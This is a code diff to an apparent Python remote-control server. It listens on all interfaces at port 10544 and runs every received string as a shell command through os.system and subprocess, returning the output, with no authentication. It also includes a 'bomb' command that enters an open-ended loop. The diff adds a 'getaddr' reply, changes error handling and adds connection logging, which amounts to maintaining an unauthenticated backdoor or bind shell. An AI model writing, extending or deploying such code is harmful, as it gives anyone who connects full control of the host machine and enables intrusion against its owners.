@@ -23,7 +23,7 @@ def goto(line) :
   global lineNumber
 
 
-MAX_LENGTH = 50000
+MAX_LENGTH = 100000
 
 PORT = 10544
 HOST = '0.0.0.0'
@@ -31,7 +31,6 @@ HOST = '0.0.0.0'
 def handle(clientsocket):
   while True:
     buf = clientsocket.recv(MAX_LENGTH).decode("utf-8")
-    print('Connected')
     if buf == '': return #client terminated connection
     #buf = buf.decode("utf-8")
     try:
@@ -39,11 +38,17 @@ def handle(clientsocket):
         os.system(buf)
         print(colors.END)
         returned = subprocess.check_output(buf)
-        clientsocket.send(returned)
+        clientsocket.send(returned.encode("UTF-8"))
     except:
       line = 16
-      execmsg = 'Executed'
-      clientsocket.send(execmsg.encode('utf-8'))
+      if buf == 'getaddr':
+          print('Executed')
+          clientsocket.send(servaddr.encode('UTF-8'))
+      else:
+          print('Failed')
+          failedmsg = 'Failed'
+          clientsocket.send(failedmsg.encode("UTF-8"))
+          line = 16
     if buf == 'bomb':
         bomb = True
         while bomb == True:
@@ -84,6 +89,9 @@ serversocket.listen(10)
 while 1:
     #accept connections from outside
     (clientsocket, address) = serversocket.accept()
+    print(colors.GREEN + 'New Connection' + colors.END)
     #Multiple Threads
     ct = Thread(target=handle, args=(clientsocket,))
+    print(colors.GREEN + 'Starting new thread')
     ct.start()
+    print(colors.GREEN + colors.BOLD + 'Thread Started')
